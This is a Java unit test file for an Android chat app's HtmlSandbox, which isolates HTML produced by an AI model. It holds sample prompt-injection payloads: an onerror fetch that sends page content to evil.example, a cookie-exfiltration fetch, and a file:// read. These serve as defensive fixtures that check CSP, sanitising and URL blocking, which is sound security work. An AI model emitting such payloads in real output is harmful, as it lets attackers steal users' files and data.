package com.oilquiz.app.ai.chat.component;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import org.json.JSONObject;
import org.junit.Test;

/**
 * {@link HtmlSandbox} 的信任档口径（Track B0-1 验收用例）。
 *
 * <p>改造前 html 组件对任何来源都开 JS + 挂 Java 桥 + 给 file:// 放开跨源文件访问，
 * 模型只要被提示词注入诱导输出一段 HTML，就能读本地文件、写剪贴板、把内容外发。
 * 这组用例钉住修复后的四条底线：
 * <ol>
 *   <li>模型给的 HTML 字符串一律是最严档（脚本关 + CSP 关脚本/外发）；</li>
 *   <li>可信模板只能由应用内代码声明，模型写 props 提权无效（连持久化都不带这个字段）；</li>
 *   <li>非 https / 非白名单的加载目标在建立 WebView 之前就被拦下；</li>
 *   <li>超长内联内容截断，不整块塞进 WebView。</li>
 * </ol>
 */
public class HtmlSandboxTest {

    /** 典型的提示词注入载荷：读页面内容外发 + 试探本地文件 */
    private static final String MALICIOUS_HTML =
            "<img src=x onerror=\"fetch('https://evil.example/?d='+encodeURIComponent(document.body.innerHTML))\">"
                    + "<script>location='file:///sdcard/Download/secret.pdf'</script>"
                    + "<form action='https://evil.example/upload'><input name='leak' value='1'></form>";

    // -------------------------------------------------- 默认档：模型内联 HTML

    @Test
    public void modelSuppliedHtmlFallsToUntrustedInlineMode() {
        ComponentData data = new ComponentData("html", props("html", MALICIOUS_HTML));

        HtmlSandbox.Decision d = HtmlSandbox.resolve(null, data, MALICIOUS_HTML, "");

        assertEquals(HtmlSandbox.Trust.INLINE_UNTRUSTED, d.trust);
        assertNull(d.loadUrl);
        assertFalse(d.isBlocked());
    }

    @Test
    public void untrustedContentIsCappedAndBlockedFromScripting() {
        HtmlSandbox.Decision d = HtmlSandbox.resolve(null,
                new ComponentData("html", props("html", MALICIOUS_HTML)), MALICIOUS_HTML, "");
        String sandboxed = HtmlSandbox.injectCsp(d.html, d.trust);

        assertTrue("CSP 必须禁脚本", sandboxed.contains("script-src 'none'"));
        assertTrue("CSP 必须断开外发通道", sandboxed.contains("connect-src 'none'"));
        assertTrue("CSP 必须禁表单提交外发", sandboxed.contains("form-action 'none'"));
        assertTrue("CSP 必须禁嵌套框架", sandboxed.contains("frame-src 'none'"));
        assertTrue("CSP 必须禁 object/embed", sandboxed.contains("object-src 'none'"));
        assertTrue("CSP 必须限制 base 劫持", sandboxed.contains("base-uri 'none'"));
    }

    @Test
    public void sanitizerKeepsSimpleFragment() {
        assertEquals("<p>hi</p>", HtmlSandbox.sanitizeInline("<p>hi</p>"));
    }

    @Test
    public void inlineSanitizerStripsExecutionVectorsButKeepsStyling() {
        String dirty = "<p style='color:#2563EB'>正常段落 <b>加粗</b></p>"
                + "<img src=x onerror=\"fetch('https://evil/?d='+document.cookie)\">"
                + "<script>location='https://evil'</script>"
                + "<a href='javascript:alert(1)'>点我</a>"
                + "<iframe src='https://evil'></iframe>";

        String clean = HtmlSandbox.sanitizeInline(dirty);

        assertFalse("事件属性必须剥掉", clean.contains("onerror"));
        assertFalse("script 标签必须删掉", clean.contains("<script"));
        assertFalse("iframe 必须删掉", clean.contains("<iframe"));
        assertFalse("javascript: 协议必须剥掉", clean.contains("javascript:"));
        assertTrue("排版内容不能被打碎", clean.contains("正常段落"));
        assertTrue("加粗保留", clean.contains("<b>加粗</b>"));
        assertTrue("内联 style 保留（模型写的配色仍生效）", clean.contains("style="));
    }

    @Test
    public void inlineSanitizerHandlesFullDocumentsAndFailsClosed() {
        String doc = "<!DOCTYPE html><html><head><title>t</title></head><body>"
                + "<h1>标题</h1><script>evil()</script></body></html>";
        String clean = HtmlSandbox.sanitizeInline(doc);
        assertTrue("完整文档仍走 wrapHtml 的原样分支", clean.contains("<html"));
        assertTrue("正文保留", clean.contains("<h1>标题</h1>"));
        assertFalse("脚本删干净", clean.contains("<script"));

        // 净化失败（异常输入）时是"只留纯文本"而不是"原样放行"
        assertEquals("纯文本兜底", "abc", HtmlSandbox.sanitizeInline("abc"));
    }

    @Test
    public void cspMetaGoesInsideHeadOfFullDocument() {
        String doc = "<!DOCTYPE html><html lang=\"zh\"><head><meta charset=\"utf-8\"></head>"
                + "<body><p>x</p></body></html>";

        String out = HtmlSandbox.injectCsp(doc, HtmlSandbox.Trust.INLINE_UNTRUSTED);

        int meta = out.indexOf("Content-Security-Policy");
        int headClose = out.indexOf("</head>");
        assertTrue("meta 应落在 <head> 内", meta > 0 && meta < headClose);
    }

    @Test
    public void templateTierGetsCspTooBecauseItsScriptsAreOn() {
        // 模板档 JS 必须开（mermaid/katex 靠脚本渲染），而 looksLikeInternalTemplate 的指纹兜底
        // 让模型给的字符串也可能落进这一档——"没挂桥"拦不住页面里的 fetch，所以外发通道得靠 CSP 关。
        String meta = HtmlSandbox.cspMetaFor(HtmlSandbox.Trust.INTERNAL_TEMPLATE);
        assertNotNull("模板档必须有自己的 CSP", meta);
        assertTrue(meta.contains("connect-src 'none'"));
        assertTrue(meta.contains("form-action 'none'"));
        assertTrue(meta.contains("frame-src 'none'"));
        assertTrue(meta.contains("worker-src 'none'"));
        // 脚本通道必须留着：收紧会把流程图/公式直接渲没
        assertTrue(meta.contains("script-src 'self' 'unsafe-inline'"));

        String doc = HtmlSandbox.injectCsp(
                "<!DOCTYPE html><html><head></head><body>"
                        + "<script src=\"js/mermaid.min.js\"></script></body></html>",
                HtmlSandbox.Trust.INTERNAL_TEMPLATE);
        assertTrue("完整文档要把 meta 落进 head", doc.contains("Content-Security-Policy"));
    }

    @Test
    public void localFileAndRemotePageStayWithoutCsp() {
        // 本地报表要连本地数据、远程页本来就要发请求——这两档注入 CSP 会直接砍掉功能
        assertNull(HtmlSandbox.cspMetaFor(HtmlSandbox.Trust.LOCAL_FILE));
        assertNull(HtmlSandbox.cspMetaFor(HtmlSandbox.Trust.REMOTE_PAGE));
    }

    @Test
    public void oversizedInlineHtmlIsTruncatedNotDumpedWhole() {
        StringBuilder big = new StringBuilder();
        for (int i = 0; i < 40000; i++) {
            big.append("<p>段落 ").append(i).append(" 内容内容内容内容</p>");
        }
        String content = big.toString();
        assertTrue("用例前提：内容需超过上限", content.length() > HtmlSandbox.MAX_INLINE_HTML_CHARS);

        HtmlSandbox.Decision d = HtmlSandbox.resolve(null,
                new ComponentData("html", props("html", content)), content, "");

        assertTrue("截断后的长度必须小于上限+容错", d.html.length() < content.length());
        assertTrue("必须置上截断标记，由渲染层出提示文案", d.truncated);
    }

    // -------------------------------------------------- 可信声明不可被内容自证

    @Test
    public void internalTemplateFlagIsNotPersistable() {
        ComponentData trusted = ComponentData.ofTrustedTemplate("html",
                props("html", "<div class=\"mermaid\">graph TD;A-->B;</div>"));
        assertTrue(trusted.internalTemplate);

        // Gson 持久化走 transient 跳过 + toPersistableJson 只写 type/props：标记不会落盘，
        // 落盘的旧数据也不会带上它
        String persisted = trusted.toPersistableJson();
        assertFalse(persisted.contains("internalTemplate"));

        ComponentData restored = ComponentData.fromPersistableJson(persisted);
        assertNotNull(restored);
        assertFalse("会话恢复后不得自动继承可信档", restored.internalTemplate);
    }

    @Test
    public void modelCannotForgeTrustedFlag() {
        // 模型在自己输出的 component JSON 里写 internalTemplate/props.trusted 都不算数
        ComponentData forged = ComponentData.fromJson(
                "{\"type\":\"html\",\"internalTemplate\":true,"
                        + "\"props\":{\"internalTemplate\":true,\"trusted\":true,\"html\":\"<b>x</b>\"}}");

        HtmlSandbox.Decision d = HtmlSandbox.resolve(null, forged, "<b>x</b>", "");

        assertFalse(forged.internalTemplate);
        assertEquals(HtmlSandbox.Trust.INLINE_UNTRUSTED, d.trust);
    }

    @Test
    public void legacyMermaidAndKatexTemplatesAreRecognisedByFingerprint() {
        // 改造前持久化的历史消息没有 transient 标记，靠模板指纹仍能走可信档，
        // 否则老会话里的流程图/公式会集体变成"空白卡片"
        String mermaid = "<!DOCTYPE html><html><head><script src=\"js/mermaid.min.js\"></script></head>"
                + "<body><div class=\"mermaid\">graph TD;A-->B;</div></body></html>";
        String katex = "<!DOCTYPE html><html><head><link rel=\"stylesheet\" href=\"css/katex.min.css\"/>"
                + "<script src=\"js/katex.min.js\"></script></head><body></body></html>";

        assertTrue(HtmlSandbox.looksLikeInternalTemplate(mermaid));
        assertTrue(HtmlSandbox.looksLikeInternalTemplate(katex));
        assertEquals(HtmlSandbox.Trust.INTERNAL_TEMPLATE,
                HtmlSandbox.resolve(null, null, mermaid, "").trust);
        assertFalse("模型自己拼的类似结构不算内置模板",
                HtmlSandbox.looksLikeInternalTemplate(
                        "<script src=\"js/mermaid.min.js\"></script><div>hello</div>"));
    }

    // -------------------------------------------------- 加载目标白名单

    @Test
    public void plainHttpPageIsBlockedInCard() {
        HtmlSandbox.Decision d = HtmlSandbox.resolve(null,
                new ComponentData("html", props("url", "http://example.com")), "",
                "http://example.com");

        assertTrue(d.isBlocked());
        assertEquals(HtmlSandbox.Block.HTTP_NOT_ALLOWED, d.blocked);
    }

    @Test
    public void localhostHttpIsWhitelisted() {
        HtmlSandbox.Decision d = HtmlSandbox.resolve(null,
                new ComponentData("html", props("url", "http://127.0.0.1:8000/report.html")), "",
                "http://127.0.0.1:8000/report.html");

        assertEquals(HtmlSandbox.Trust.REMOTE_PAGE, d.trust);
        assertFalse(d.isBlocked());
    }

    @Test
    public void dangerousSchemesAreBlocked() {
        for (String url : new String[]{"javascript:alert(1)", "data:text/html,<script>1</script>",
                "blob:https://x/y", "content://com.other.provider/secret", "intent:#Intent;"}) {
            HtmlSandbox.Decision d = HtmlSandbox.resolve(null,
                    new ComponentData("html", props("url", url)), "", url);
            assertTrue("应拦下 " + url, d.isBlocked());
        }
    }

    @Test
    public void localFileOutsideWorkspaceIsBlockedEvenWithoutContext() {
        // context 为 null 时白名单为空 → 任何 file:// 目标都越界，符合"默认拒绝"
        String url = "file:///sdcard/Download/secret.html";
        HtmlSandbox.Decision d = HtmlSandbox.resolve(null,
                new ComponentData("html", props("url", url)), "", url);

        assertTrue(d.isBlocked());
        assertEquals(HtmlSandbox.Block.LOCAL_OUTSIDE_WORKSPACE, d.blocked);
    }

    @Test
    public void bridgeOnlyForWorkspaceLocalFiles() {
        assertFalse(HtmlSandbox.allowsBridge(HtmlSandbox.Trust.INLINE_UNTRUSTED));
        assertFalse(HtmlSandbox.allowsBridge(HtmlSandbox.Trust.INTERNAL_TEMPLATE));
        assertFalse(HtmlSandbox.allowsBridge(HtmlSandbox.Trust.REMOTE_PAGE));
        assertTrue(HtmlSandbox.allowsBridge(HtmlSandbox.Trust.LOCAL_FILE));
    }

    @Test
    public void scriptsOnlyDisabledForUntrustedInlineMode() {
        // 唯一关脚本的档位就是"模型直接给的 HTML"这一档；其余档位的依赖能力都要有 JS
        assertFalse(HtmlSandbox.scriptsEnabled(HtmlSandbox.Trust.INLINE_UNTRUSTED));
        assertTrue(HtmlSandbox.scriptsEnabled(HtmlSandbox.Trust.INTERNAL_TEMPLATE));
        assertTrue(HtmlSandbox.scriptsEnabled(HtmlSandbox.Trust.LOCAL_FILE));
        assertTrue(HtmlSandbox.scriptsEnabled(HtmlSandbox.Trust.REMOTE_PAGE));
    }

    @Test
    public void filePathFromUrlKeepsPlusAndDecodesPercent() {
        // 报表文件名里带 '+' 很常见，URLDecoder 会把它当空格改坏，所以自己解 %XX
        assertEquals("/sdcard/x/报告+附录.html",
                HtmlSandbox.filePathFromUrl("file:///sdcard/x/%E6%8A%A5%E5%91%8A+%E9%99%84%E5%BD%95.html"));
        assertEquals("/data/user/0/com.oilquiz.app/files/out/report.html",
                HtmlSandbox.filePathFromUrl(
                        "file:///data/user/0/com.oilquiz.app/files/out/report.html#top"));
    }

    private static JSONObject props(String key, String value) {
        JSONObject p = new JSONObject();
        try {
            p.put(key, value);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        return p;
    }
}
